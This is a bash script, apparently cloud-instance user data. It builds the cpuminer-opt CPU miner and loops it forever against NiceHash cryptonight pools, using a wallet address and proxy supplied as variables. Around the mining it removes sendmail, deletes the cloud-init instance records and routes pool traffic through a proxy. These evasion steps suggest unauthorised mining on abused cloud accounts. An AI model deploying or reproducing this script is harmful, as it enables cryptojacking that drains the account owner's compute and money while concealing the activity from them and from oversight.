#!/bin/bash
sudo yum remove sendmail -y
sudo yum install git build-essential automake libjansson-dev libgmp-dev libcurl4-openssl-dev libssl-dev pthreads zlib openssl-devel gcc-c++ curl-devel libmpc-devel gmp  gmp-devel  mpfr  mpfr-devel  libmpc  libmpc-devel -y
cd /home/ec2user
git clone --recursive https://github.com/JayDDee/cpuminer-opt.git
cd cpuminer-opt
ln -s /usr/include/curl curl
git checkout linux
sudo CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl
#sudo sysctl -w vm.nr_hugepages=6
make
rm -rf /var/lib/cloud/instance/*
while true; do
	./cpuminer -a cryptonight -o stratum+tcp://cryptonight.usa.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
	./cpuminer -a cryptonight -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
done
